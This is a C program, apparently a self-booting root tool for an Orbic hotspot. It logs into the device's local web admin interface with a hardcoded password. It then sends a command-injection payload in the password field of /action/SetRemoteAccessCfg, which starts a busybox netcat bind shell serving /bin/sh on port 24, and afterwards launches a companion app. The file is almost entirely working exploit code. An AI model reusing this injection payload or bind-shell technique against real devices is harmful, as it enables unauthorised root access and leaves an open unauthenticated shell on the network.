/*
 * DagShell Self-Booter
 * Runs the HTTP exploit from within the device to enable port 24 and start DagShell
 * Compile: arm-linux-gcc -static -o dagshell_boot dagshell_boot.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ADMIN_PASSWORD "1d495f58"
#define LOCALHOST "127.0.0.1"
#define WEB_PORT 80
#define SHELL_PORT 24

// Simple HTTP request sender
int http_request(const char *host, int port, const char *method, const char *path, 
                 const char *body, const char *cookie, char *response, int resp_size) {
    int sock;
    struct sockaddr_in server;
    char request[4096];
    int len;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);
    
    // Set timeout
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return -1;
    }
    
    // Build request
    if (body && strlen(body) > 0) {
        len = snprintf(request, sizeof(request),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %zu\r\n"
            "%s%s"
            "Connection: close\r\n"
            "\r\n"
            "%s",
            method, path, host, strlen(body),
            cookie ? "Cookie: " : "", cookie ? cookie : "",
            body);
    } else {
        len = snprintf(request, sizeof(request),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "%s%s"
            "Connection: close\r\n"
            "\r\n",
            method, path, host,
            cookie ? "Cookie: " : "", cookie ? cookie : "");
    }
    
    send(sock, request, len, 0);
    
    // Read response
    memset(response, 0, resp_size);
    recv(sock, response, resp_size - 1, 0);
    
    close(sock);
    return 0;
}

// Check if port is open
int check_port(const char *host, int port) {
    int sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);
    
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    int result = connect(sock, (struct sockaddr *)&server, sizeof(server));
    close(sock);
    
    return result == 0;
}

int main(int argc, char *argv[]) {
    char response[8192];
    char cookie[256] = "";
    char *password = ADMIN_PASSWORD;
    
    printf("=== DagShell Self-Booter ===\n\n");
    
    // Allow password override
    if (argc > 1) {
        password = argv[1];
    }
    
    // Check if DagShell is already running
    if (check_port(LOCALHOST, 8081)) {
        printf("DagShell already running on port 8081!\n");
        return 0;
    }
    
    // Check if shell port is already open
    if (check_port(LOCALHOST, SHELL_PORT)) {
        printf("Port 24 already open, starting DagShell...\n");
        system("/data/orbic_app &");
        return 0;
    }
    
    printf("[1/4] Getting login info...\n");
    if (http_request(LOCALHOST, WEB_PORT, "GET", "/goform/GetLoginInfo", NULL, NULL, response, sizeof(response)) < 0) {
        printf("ERROR: Failed to connect to web server\n");
        return 1;
    }
    
    // Extract cookie from response (very basic parsing)
    char *cookie_start = strstr(response, "Set-Cookie:");
    if (cookie_start) {
        cookie_start += 12;
        while (*cookie_start == ' ') cookie_start++;
        char *cookie_end = strchr(cookie_start, ';');
        if (cookie_end) {
            strncpy(cookie, cookie_start, cookie_end - cookie_start);
        }
    }
    printf("  Cookie: %s\n", cookie[0] ? cookie : "(none)");
    
    printf("[2/4] Logging in...\n");
    char login_body[256];
    snprintf(login_body, sizeof(login_body), "{\"password\":\"%s\"}", password);
    if (http_request(LOCALHOST, WEB_PORT, "POST", "/goform/login", login_body, cookie, response, sizeof(response)) < 0) {
        printf("ERROR: Login failed\n");
        return 1;
    }
    
    printf("[3/4] Running exploit...\n");
    // The exploit payload - starts netcat shell on port 24
    char exploit_body[] = "{\"password\": \"\\\"; busybox nc -ll -p 24 -e /bin/sh & #\"}";
    if (http_request(LOCALHOST, WEB_PORT, "POST", "/action/SetRemoteAccessCfg", exploit_body, cookie, response, sizeof(response)) < 0) {
        printf("ERROR: Exploit failed\n");
        return 1;
    }
    
    printf("[4/4] Waiting for shell...\n");
    sleep(2);
    
    if (check_port(LOCALHOST, SHELL_PORT)) {
        printf("SUCCESS! Port 24 is open.\n");
    } else {
        printf("WARNING: Port 24 may not be open\n");
    }
    
    printf("\nStarting DagShell...\n");
    system("/data/orbic_app &");
    
    // Give it time to start
    sleep(2);
    
    if (check_port(LOCALHOST, 8081)) {
        printf("\n=== DagShell is running! ===\n");
        printf("Access at: http://192.168.1.1:8081/\n");
    } else {
        printf("WARNING: DagShell may not have started correctly\n");
    }
    
    return 0;
}
